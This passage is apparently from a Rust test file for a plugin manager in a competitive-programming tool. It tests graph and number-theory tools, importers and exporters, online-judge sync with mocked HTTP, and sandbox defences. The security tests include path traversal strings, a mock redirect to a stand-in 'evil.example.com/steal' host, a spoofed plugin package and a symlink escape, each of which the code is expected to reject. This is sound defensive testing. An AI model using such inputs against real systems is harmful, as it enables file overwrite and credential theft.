    assert!(math_ui.contains("module.exports = { render }"));
    assert!(mgr.read_ui_source("complexity-mem").unwrap().is_none());

    // export_builtin_copy must export ui.js as well as manifest.toml and index.js
    let exported_dir = mgr.export_builtin_copy("graph-editor").unwrap();
    assert!(exported_dir.join("manifest.toml").is_file());
    assert!(exported_dir.join("index.js").is_file());
    assert!(exported_dir.join("ui.js").is_file());
    let override_ui = mgr.read_ui_source("graph-editor").unwrap().unwrap();
    assert_eq!(override_ui, graph_ui);

    // 2. graph-editor: edge_list, parent_array, adj_list, coords + open command
    let g_edge = mgr
        .run_tool(
            "graph-editor",
            "parse-graph",
            serde_json::json!({
                "format": "edge_list",
                "text": "1 2 5\n1 3 2\n2 4 1",
                "directed": true,
                "weighted": true,
                "layout": "force"
            }),
            None,
        )
        .unwrap();
    assert_eq!(g_edge.blocks.len(), 2);
    match &g_edge.blocks[0] {
        ToolOutputBlock::Graph {
            nodes,
            edges,
            directed,
            ..
        } => {
            assert_eq!(nodes.len(), 4);
            assert_eq!(edges.len(), 3);
            assert_eq!(*directed, Some(true));
        }
        other => panic!("expected Graph block, got {other:?}"),
    }
    match &g_edge.blocks[1] {
        ToolOutputBlock::Svg { svg, .. } => assert!(svg.contains("<svg")),
        other => panic!("expected Svg block, got {other:?}"),
    }

    let g_parent = mgr
        .run_tool(
            "graph-editor",
            "parse-graph",
            serde_json::json!({
                "format": "parent_array",
                "text": "1 1 2 2",
                "one_indexed": true,
                "layout": "tree"
            }),
            None,
        )
        .unwrap();
    if let ToolOutputBlock::Graph { nodes, edges, .. } = &g_parent.blocks[0] {
        assert_eq!(nodes.len(), 5);
        assert_eq!(edges.len(), 4);
    } else {
        panic!("expected Graph block");
    }

    let g_adj = mgr
        .run_tool(
            "graph-editor",
            "parse-graph",
            serde_json::json!({
                "format": "adj_list",
                "text": "1: 2(7) 3(4)\n2: 3(1)",
            }),
            None,
        )
        .unwrap();
    if let ToolOutputBlock::Graph { nodes, edges, .. } = &g_adj.blocks[0] {
        assert_eq!(nodes.len(), 3);
        assert_eq!(edges.len(), 3);
    } else {
        panic!("expected Graph block");
    }

    let g_coords = mgr
        .run_tool(
            "graph-editor",
            "parse-graph",
            serde_json::json!({
                "format": "coords",
                "text": "1 0 0\n2 10 0\nedge 1 2",
                "layout": "coords"
            }),
            None,
        )
        .unwrap();
    if let ToolOutputBlock::Graph { nodes, edges, .. } = &g_coords.blocks[0] {
        assert_eq!(nodes.len(), 2);
        assert_eq!(edges.len(), 1);
    } else {
        panic!("expected Graph block");
    }

    let open_graph_cmd = mgr
        .run_command("graph-editor", "open", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(
        open_graph_cmd,
        PluginCommandAction::OpenTool {
            plugin_id: "graph-editor".into(),
            tool_id: None,
            initial_inputs: None,
        }
    );

    // 3. math-bitwise: bitwise, number-theory, mod-reference + open command
    let bw = mgr
        .run_tool(
            "math-bitwise",
            "bitwise",
            serde_json::json!({ "value": "0xFF" }),
            None,
        )
        .unwrap();
    assert!(bw.summary.as_deref().unwrap().contains("popcount=8"));

    let nt = mgr
        .run_tool(
            "math-bitwise",
            "number-theory",
            serde_json::json!({
                "n": "360",
                "a": "3",
                "b": "998244351",
                "mod": "998244353",
                "crt": "2 3; 3 5; 2 7"
            }),
            None,
        )
        .unwrap();
    assert_eq!(nt.blocks.len(), 3);
    let nt_json = serde_json::to_string(&nt).unwrap();
    assert!(nt_json.contains("2^3 × 3^2 × 5"));
    assert!(nt_json.contains("x ≡ 23 (mod 105)"));

    let mods = mgr
        .run_tool("math-bitwise", "mod-reference", serde_json::json!({}), None)
        .unwrap();
    let mods_json = serde_json::to_string(&mods).unwrap();
    assert!(mods_json.contains("998244353"));
    assert!(mods_json.contains("1000000007"));
    assert!(mods_json.contains("469762049"));

    let open_math_cmd = mgr
        .run_command("math-bitwise", "open", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(
        open_math_cmd,
        PluginCommandAction::OpenTool {
            plugin_id: "math-bitwise".into(),
            tool_id: None,
            initial_inputs: None,
        }
    );

    // 4. complexity-mem: complexity & memory
    let cpx = mgr
        .run_tool(
            "complexity-mem",
            "complexity",
            serde_json::json!({ "n": 200000, "time_limit_sec": 1, "const_factor": 1 }),
            None,
        )
        .unwrap();
    assert!(!cpx.blocks.is_empty());
    let mem = mgr
        .run_tool(
            "complexity-mem",
            "memory",
            serde_json::json!({ "data_type": "int64", "dimensions": "1024x1024", "limit_mb": 256 }),
            None,
        )
        .unwrap();
    assert!(mem.summary.as_deref().unwrap().contains("8.000 MiB"));

    // 5. string-lab: analyze
    let str_res = mgr
        .run_tool(
            "string-lab",
            "analyze",
            serde_json::json!({ "text": "abacaba", "pattern": "aba" }),
            None,
        )
        .unwrap();
    let str_json = serde_json::to_string(&str_res).unwrap();
    assert!(str_json.contains("[0, 4]"));
    assert!(str_json.contains("abacaba"));
    assert_eq!(str_res.blocks.len(), 4);
}

#[test]
fn custom_headless_codesnap_svg_tool_with_highlight_and_png() {
    use crate::tool::ToolOutputBlock;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "codesnap-lite"
name = "CodeSnap Lite"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]

[[tools]]
id = "snap"
name = "Render Code Card"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r##"
module.exports = {
  runTool(toolId, inputs) {
    const hl = host.highlight(inputs.code || "", inputs.lang || "cpp");
    const width = 320;
    const height = 40 + hl.lines.length * 20;
    const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="' + width + '" height="' + height + '"><rect width="100%" height="100%" rx="8" fill="#1e293b"/></svg>';
    const pngB64 = host.render.svgToPng(svg, 1.0);
    return {
      summary: "Highlighted " + hl.lines.length + " lines (" + hl.language + ")",
      blocks: [
        { type: "svg", title: "Card SVG", svg, width, height },
        { type: "image", title: "Card PNG", png_base64: pngB64, width, height },
      ],
    };
  },
};
"##,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();
    let res = mgr
        .run_tool(
            "codesnap-lite",
            "snap",
            serde_json::json!({ "code": "int main() { return 0; }", "lang": "cpp" }),
            None,
        )
        .unwrap();
    assert_eq!(res.blocks.len(), 2);
    assert!(matches!(&res.blocks[0], ToolOutputBlock::Svg { .. }));
    match &res.blocks[1] {
        ToolOutputBlock::Image { png_base64, .. } => {
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(png_base64)
                .unwrap();
            assert_eq!(&bytes[..8], b"\x89PNG\r\n\x1a\n");
        }
        other => panic!("expected Image block, got {other:?}"),
    }
}

#[test]
fn commands_context_filtering_and_execution() {
    use crate::commands::PluginCommandAction;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "cmd-demo"
name = "Cmd Demo"
version = "0.1.0"
entry = "index.js"
capabilities = ["commands"]

[[commands]]
id = "ping"
title = "Ping"
context = "global"

[[commands]]
id = "inspect-prob"
title = "Inspect Problem"
context = "problem"

[[commands]]
id = "inspect-contest"
title = "Inspect Contest"
context = "contest"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r#"
module.exports = {
  runCommand(cmdId, ctx) {
    if (cmdId === "ping") return { type: "message", text: "pong" };
    if (cmdId === "inspect-prob") {
      return {
        type: "tool_result",
        result: {
          blocks: [{ type: "text", content: "prob=" + (ctx && ctx.problem_id) }],
        },
      };
    }
    return { type: "none" };
  },
};
"#,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();

    let global_cmds = mgr.list_commands(Some(CommandContext::Global));
    assert!(
        global_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "ping")
    );
    assert!(
        !global_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-prob")
    );

    let prob_cmds = mgr.list_commands(Some(CommandContext::Problem));
    assert!(
        prob_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-prob")
    );
    assert!(
        !prob_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-contest")
    );

    let msg = mgr
        .run_command("cmd-demo", "ping", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(
        msg,
        PluginCommandAction::Message {
            text: "pong".into()
        }
    );

    let res = mgr
        .run_command(
            "cmd-demo",
            "inspect-prob",
            serde_json::json!({ "problem_id": "a-plus-b" }),
            None,
        )
        .unwrap();
    assert!(matches!(res, PluginCommandAction::ToolResult { .. }));
}

#[test]
fn importer_and_exporter_safe_apply_and_traversal_rejection() {
    use crate::io_ext::{
        DraftSample, ExportContext, ExportFileEntry, ExportOutput, ImportDraft, ImportFileInput,
        ProblemDraft, apply_import_draft, write_export_output,
    };

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "io-demo"
name = "IO Demo"
version = "0.1.0"
entry = "index.js"
capabilities = ["importer", "exporter"]

[[importers]]
id = "simple-txt"
name = "Simple Text"
extensions = [".txt"]

[[exporters]]
id = "simple-bundle"
name = "Simple Bundle"
extension = ".txt"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r#"
module.exports = {
  importPackage(files) {
    const first = files[0] || { text: "Demo Problem" };
    return {
      kind: "problem",
      id: "imported-a-plus-b",
      title: "Imported A+B",
      statement_md: first.text || "Compute A + B.",
      tags: ["math"],
      rating: 1200,
      time_limit: "2s",
      memory_limit: "512MB",
      samples: [{ input: "1 2\n", output: "3\n" }],
      source: { platform: "demo", id: "P100" },
      assets: { "fig.txt": "aGVsbG8=" },
    };
  },
  exportPackage(ctx) {
    return {
      summary: "Exported " + ctx.id,
      files: [
        { path: "meta.json", text: JSON.stringify({ id: ctx.id, title: ctx.title }) },
        { path: "nested/statement.md", text: ctx.statement_md || "" },
      ],
    };
  },
};
"#,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();
    assert_eq!(mgr.list_importers().len(), 1);
    assert_eq!(mgr.list_exporters().len(), 1);

    // 1. Run importer and apply to workspace
    let ws_dir = tempfile::tempdir().unwrap();
    let ws = xcpc_storage::init_workspace(ws_dir.path()).unwrap();

    let draft = mgr
        .run_importer(
            "io-demo",
            "simple-txt",
            &[ImportFileInput {
                name: "a.txt".into(),
                content_base64: String::new(),
                text: Some("Given A and B, output A+B.".into()),
            }],
        )
        .unwrap();
    let report = apply_import_draft(&ws, &draft).unwrap();
    assert_eq!(report.kind, "problem");
    assert_eq!(report.created_ids, vec!["imported-a-plus-b"]);
    assert!(report.skipped_ids.is_empty());
    assert!(
        ws.root()
            .join("problems/imported-a-plus-b/assets/fig.txt")
            .is_file()
    );
    assert_eq!(
        std::fs::read_to_string(ws.root().join("problems/imported-a-plus-b/samples/01.in"))
            .unwrap(),
        "1 2\n"
    );

    // Second import of same source deduplicates into skipped_ids
    let report2 = apply_import_draft(&ws, &draft).unwrap();
    assert!(report2.created_ids.is_empty());
    assert_eq!(report2.skipped_ids, vec!["imported-a-plus-b"]);

    // Asset path traversal must be rejected with ZipSlip
    let bad_draft = ImportDraft::Problem(ProblemDraft {
        id: Some("evil-prob".into()),
        title: "Evil".into(),
        statement_md: "x".into(),
        editorial_md: None,
        tags: None,
        rating: None,
        time_limit: None,
        memory_limit: None,
        samples: vec![DraftSample {
            input: "1\n".into(),
            output: "1\n".into(),
        }],
        source: None,
        assets: Some(BTreeMap::from([(
            "../../escape.txt".to_string(),
            "aGVsbG8=".to_string(),
        )])),
    });
    let err = apply_import_draft(&ws, &bad_draft).unwrap_err();
    assert!(matches!(err, PluginError::ZipSlip(_)), "got: {err:?}");
    assert!(!ws.root().join("problems/evil-prob").exists());

    // Read-only workspace must reject import
    let ro_ws = xcpc_storage::Workspace::open(ws_dir.path(), true).unwrap();
    let ro_err = apply_import_draft(&ro_ws, &draft).unwrap_err();
    assert!(
        matches!(ro_err, PluginError::PermissionDenied { .. }),
        "got: {ro_err:?}"
    );

    // 2. Run exporter and write output safely
    let export_out = mgr
        .run_exporter(
            "io-demo",
            "simple-bundle",
            &ExportContext {
                kind: "problem".into(),
                id: "imported-a-plus-b".into(),
                title: "Imported A+B".into(),
                metadata: serde_json::json!({ "rating": 1200 }),
                statement_md: Some("Given A and B".into()),
                editorial_md: None,
                samples: None,
                pdf_base64: None,
                problems: None,
            },
        )
        .unwrap();
    let out_dir = ws.root().join("build/export-demo");
    let written = write_export_output(&ws, &export_out, &out_dir).unwrap();
    assert_eq!(written.len(), 2);
    assert!(out_dir.join("meta.json").is_file());
    assert!(out_dir.join("nested/statement.md").is_file());

    // Export path traversal must be rejected
    let evil_export = ExportOutput {
        files: vec![ExportFileEntry {
            path: "../outside.txt".into(),
            content_base64: None,
            text: Some("pwned".into()),
        }],
        summary: None,
    };
    let exp_err = write_export_output(&ws, &evil_export, &out_dir).unwrap_err();
    assert!(
        matches!(exp_err, PluginError::ZipSlip(_)),
        "got: {exp_err:?}"
    );

    // Read-only workspace must reject exporting into workspace dir
    let ro_exp_err = write_export_output(&ro_ws, &export_out, &out_dir).unwrap_err();
    assert!(
        matches!(ro_exp_err, PluginError::PermissionDenied { .. }),
        "got: {ro_exp_err:?}"
    );
}

#[test]
fn atcoder_pagination_boundary_dedup_verify_503_and_contest_time_guard() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("atcoder").unwrap();

    // Build page 1 (500 items, epochs 1000..=1498 plus 2 items sharing boundary epoch 1499).
    let mut page1_items = Vec::with_capacity(500);
    for i in 0..498usize {
        let id = 10_000 + i;
        let epoch = 1000 + i;
        page1_items.push(format!(
            r#"{{"id":{id},"epoch_second":{epoch},"problem_id":"abc350_a","contest_id":"abc350","result":"AC","language":"C++"}}"#
        ));
    }
    page1_items.push(r#"{"id":10498,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"WA","language":"C++"}"#.into());
    page1_items.push(r#"{"id":10499,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"AC","language":"C++"}"#.into());
    let page1_body = format!("[{}]", page1_items.join(","));

    // Page 2 (from_second=1499): repeats 10498 & 10499 at epoch 1499, adds 10500 & 10501 at epoch 1499, plus 10502 at epoch 1500.
    let page2_body = r#"[
        {"id":10498,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"WA","language":"C++"},
        {"id":10499,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10500,"epoch_second":1499,"problem_id":"abc350_c","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10501,"epoch_second":1499,"problem_id":"abc350_d","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10502,"epoch_second":1500,"problem_id":"abc350_e","contest_id":"abc350","result":"AC","language":"C++"}
    ]"#;

    let mock_http = Arc::new(MockHttpClient::new(move |req| {
        if req.url.contains("from_second=0") {
            ok_json(&page1_body)
        } else if req.url.contains("from_second=1499") {
            ok_json(page2_body)
        } else if req.url.contains("problems.json") {
            ok_json("[]")
        } else if req.url.contains("problem-models.json") {
            ok_json("{}")
        } else if req.url == "https://atcoder.jp/users/outage_user/history/json" {
            ok_json("[]")
        } else if req.url == "https://atcoder.jp/users/outage_user" {
            Ok(HttpResponse {
                status: 503,
                headers: BTreeMap::new(),
                body: "Service Unavailable".into(),
            })
        } else if req.url == "https://atcoder.jp/contests/" {
            Ok(HttpResponse {
                status: 200,
                headers: BTreeMap::new(),
                body: r##"
                    <div id="contest-table-upcoming"><table><tbody>
                      <tr>
                        <td>TBD</td>
                        <td><a href="/contests/bad_time">Broken Time Contest</a></td>
                        <td>01:40</td>
                      </tr>
                      <tr>
                        <td>2026-12-01 21:00:00+0900</td>
                        <td><a href="/contests/abc401">AtCoder Beginner Contest 401</a></td>
                        <td>01:40</td>
                      </tr>
                    </tbody></table></div>
                "##
                .into(),
            })
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);

    let batch = client
        .sync_submissions(
            &OjContext {
                handle: "chokudai".into(),
            },
            None,
        )
        .unwrap();
    assert_eq!(batch.submissions.len(), 503);
    assert_eq!(batch.next_cursor.as_deref(), Some("1500"));
    let unique_ids: std::collections::HashSet<&str> = batch
        .submissions
        .iter()
        .map(|s| s.submission_id.as_str())
        .collect();
    assert_eq!(unique_ids.len(), 503);
    assert!(unique_ids.contains("10500"));
    assert!(unique_ids.contains("10501"));
    assert!(unique_ids.contains("10502"));

    // Verify distinguishes 503 from 404.
    let v503 = client
        .verify(&OjContext {
            handle: "outage_user".into(),
        })
        .unwrap();
    assert!(!v503.ok);
    assert_eq!(
        v503.message.as_deref(),
        Some("AtCoder 服务暂时不可用，请稍后重试")
    );

    // fetchContests skips unparseable timeText row instead of emitting start_time: 0.
    let contests = client
        .fetch_contests(&OjContext {
            handle: String::new(),
        })
        .unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "abc401");
    assert!(contests[0].start_time > 0);
}

#[test]
fn codeforces_testing_cursor_guard_and_mid_pagination_retry() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("codeforces").unwrap();

    // Case 1: TESTING submission in the middle (105=OK, 104=TESTING, 103=OK) -> cursor stops at 103.
    let http1 = Arc::new(MockHttpClient::new(|_req| {
        ok_json(
            r#"{"status":"OK","result":[
                {"id":105,"creationTimeSeconds":1700000105,"verdict":"OK","problem":{"contestId":1999,"index":"A","name":"P1"}},
                {"id":104,"creationTimeSeconds":1700000104,"verdict":"TESTING","problem":{"contestId":1999,"index":"B","name":"P2"}},
                {"id":103,"creationTimeSeconds":1700000103,"verdict":"OK","problem":{"contestId":1999,"index":"C","name":"P3"}}
            ]}"#,
        )
    }));
    let ctx1 = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: http1,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client1 = OjPluginClient::new(&loaded.entry_source, &ctx1);
    let batch1 = client1
        .sync_submissions(
            &OjContext {
                handle: "tourist".into(),
            },
            Some("100"),
        )
        .unwrap();
    assert_eq!(batch1.submissions.len(), 3);
    assert_eq!(batch1.next_cursor.as_deref(), Some("103"));

    // Case 2: Transient failure on page 2 recovers via retry.
    let mut page1 = Vec::with_capacity(1000);
    for i in 0..1000i64 {
        let id = 2000 - i;
        page1.push(format!(
            r#"{{"id":{id},"creationTimeSeconds":1700000000,"verdict":"OK","problem":{{"contestId":1999,"index":"A","name":"P"}}}}"#
        ));
    }
    let page1_json = format!(r#"{{"status":"OK","result":[{}]}}"#, page1.join(","));
    let page2_attempts = Arc::new(AtomicUsize::new(0));
    let attempts_clone = Arc::clone(&page2_attempts);
    let http2 = Arc::new(MockHttpClient::new(move |req| {
        if req.url.contains("from=1&count=1000") {
            ok_json(&page1_json)
        } else if req.url.contains("from=1001&count=1000") {
            let n = attempts_clone.fetch_add(1, Ordering::SeqCst);
            if n == 0 {
                ok_json(r#"{"status":"FAILED","comment":"Call limit exceeded"}"#)
            } else {
                ok_json(
                    r#"{"status":"OK","result":[{"id":1000,"creationTimeSeconds":1700000000,"verdict":"OK","problem":{"contestId":1999,"index":"A","name":"P"}}]}"#,
                )
            }
        } else {
            panic!("unexpected url {}", req.url);
        }
    }));
    let ctx2 = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: http2,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client2 = OjPluginClient::new(&loaded.entry_source, &ctx2);
    let batch2 = client2
        .sync_submissions(
            &OjContext {
                handle: "tourist".into(),
            },
            None,
        )
        .unwrap();
    assert_eq!(batch2.submissions.len(), 1001);
    assert_eq!(batch2.next_cursor.as_deref(), Some("2000"));
    assert_eq!(page2_attempts.load(Ordering::SeqCst), 2);
}

#[test]
fn security_redirect_whitelist_kv_traversal_repo_id_and_unpremultiplied_png() {
    // 1. Redirect to non-whitelisted host must be blocked with DomainNotAllowed.
    let manifest = minimal_manifest("redir-test", &["allowed.example.com"], false);
    let mock_http = Arc::new(MockHttpClient::new(|req| {
        if req.url == "https://allowed.example.com/start" {
            Ok(HttpResponse {
                status: 302,
                headers: BTreeMap::from([(
                    "location".to_string(),
                    "https://evil.example.com/steal".to_string(),
                )]),
                body: String::new(),
            })
        } else {
            panic!("should never follow redirect to {}", req.url);
        }
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            go() {
                return host.http.fetch({ url: "https://allowed.example.com/start" });
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "go", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::DomainNotAllowed { ref host, .. } if host == "evil.example.com"),
        "expected DomainNotAllowed for evil.example.com, got: {err:?}"
    );

    // 2. Cross-host redirect between two whitelisted hosts must strip credential headers.
    let manifest2 = minimal_manifest("redir-cred", &["a.example.com", "b.example.com"], false);
    let creds = Arc::new(MemoryCredentialStore::new());
    creds.set("redir-cred", "api_key", "super-secret").unwrap();
    let mock_http2 = Arc::new(MockHttpClient::new(|req| {
        if req.url == "https://a.example.com/auth" {
            Ok(HttpResponse {
                status: 302,
                headers: BTreeMap::from([(
                    "location".to_string(),
                    "https://b.example.com/final".to_string(),
                )]),
                body: String::new(),
            })
        } else if req.url == "https://b.example.com/final" {
            ok_json(r#"{"ok":true}"#)
        } else {
            panic!("unexpected url {}", req.url);
        }
    }));
    let host_ctx2 = HostContext {
        manifest: manifest2,
        http_client: mock_http2.clone(),
        credentials: creds,
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let src2 = r#"
        module.exports = {
            go() {
                return host.http.fetch({
                    url: "https://a.example.com/auth",
                    credentialHeader: { header: "X-Api-Key", key: "api_key" }
                });
            }
        };
    "#;
    let call = PluginRuntime::call_function(src2, "go", &[], &host_ctx2).unwrap();
    assert_eq!(call.value["status"], 200);
    let reqs = mock_http2.recorded_requests();
    assert_eq!(reqs.len(), 2);
    assert_eq!(
        reqs[0].headers.get("X-Api-Key").map(String::as_str),
        Some("super-secret")
    );
    assert!(
        !reqs[1].headers.contains_key("X-Api-Key"),
        "credential header must be stripped on cross-host redirect: {:?}",
        reqs[1].headers
    );

    // 3. KvStore::open rejects traversal IDs.
    let tmp = tempfile::tempdir().unwrap();
    assert!(matches!(
        KvStore::open(tmp.path(), "../escape"),
        Err(PluginError::ManifestInvalid(_))
    ));
    assert!(matches!(
        KvStore::open(tmp.path(), "a/b"),
        Err(PluginError::ManifestInvalid(_))
    ));

    // 4. install_from_repo_entry rejects manifest.id != entry.id.
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let spoofed_zip = make_zip(&[
        (
            "manifest.toml",
            br#"
id = "codeforces"
name = "Spoofed"
version = "9.9.9"
entry = "index.js"
capabilities = ["oj_source"]
"#,
        ),
        ("index.js", b"module.exports = {};"),
    ]);
    let entry = RepoPluginEntry {
        id: "benign-tool".into(),
        name: "Benign Tool".into(),
        version: "0.1.0".into(),
        description: "Claims to be benign-tool".into(),
        download_url: "https://repo.example.com/spoof.zip".into(),
        sha256: sha256_hex(&spoofed_zip),
        permissions: None,
    };
    let zip_clone = spoofed_zip.clone();
    let repo_http =
        MockHttpClient::new(|_| ok_json("{}")).with_bytes_handler(move |_| Ok(zip_clone.clone()));
    let id_err = mgr.install_from_repo_entry(&entry, &repo_http).unwrap_err();
    assert!(
        matches!(id_err, PluginError::InvalidPackage(_)),
        "expected InvalidPackage on ID mismatch, got: {id_err:?}"
    );
    assert!(
        !mgr.plugins_dir().join("codeforces").exists(),
        "mismatched repo plugin must not be installed"
    );

    // 5. svg_to_png_base64 produces unpremultiplied RGBA (50% opaque white has RGB ~= 255, not ~128).
    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="#ffffff" fill-opacity="0.5"/></svg>"##;
    let b64 = crate::render::svg_to_png_base64(svg, Some(1.0)).unwrap();
    let png_bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .unwrap();
    let decoder = png::Decoder::new(std::io::Cursor::new(&png_bytes));
    let mut reader = decoder.read_info().unwrap();
    let mut buf = vec![0u8; reader.output_buffer_size().unwrap()];
    let info = reader.next_frame(&mut buf).unwrap();
    let pixel = &buf[..info.buffer_size()];
    // First pixel: R, G, B should be close to 255 (straight alpha), A should be ~128.
    assert!(
        pixel[0] >= 250 && pixel[1] >= 250 && pixel[2] >= 250,
        "expected unpremultiplied white RGB >= 250, got {:?}",
        &pixel[..4]
    );
    assert!(
        (120..=136).contains(&pixel[3]),
        "expected alpha ~128, got {}",
        pixel[3]
    );
}

#[cfg(unix)]
#[test]
fn load_plugin_rejects_symlink_escape() {
    use std::os::unix::fs::symlink;

    let data_dir = tempfile::tempdir().unwrap();
    let outside_dir = tempfile::tempdir().unwrap();
    let secret_file = outside_dir.path().join("secret.js");
    std::fs::write(&secret_file, "module.exports = { secret: true };").unwrap();

    let plugin_dir = data_dir.path().join("plugins/sym-evil");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("manifest.toml"),
        r#"
id = "sym-evil"
name = "Symlink Evil"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]
"#,
    )
    .unwrap();
    symlink(&secret_file, plugin_dir.join("index.js")).unwrap();

    let mgr = PluginManager::new(data_dir.path());
    let err = mgr.load_plugin("sym-evil").unwrap_err();
    assert!(
        matches!(err, PluginError::ZipSlip(_)),
        "expected ZipSlip for symlink escape in load_plugin, got: {err:?}"
    );
}
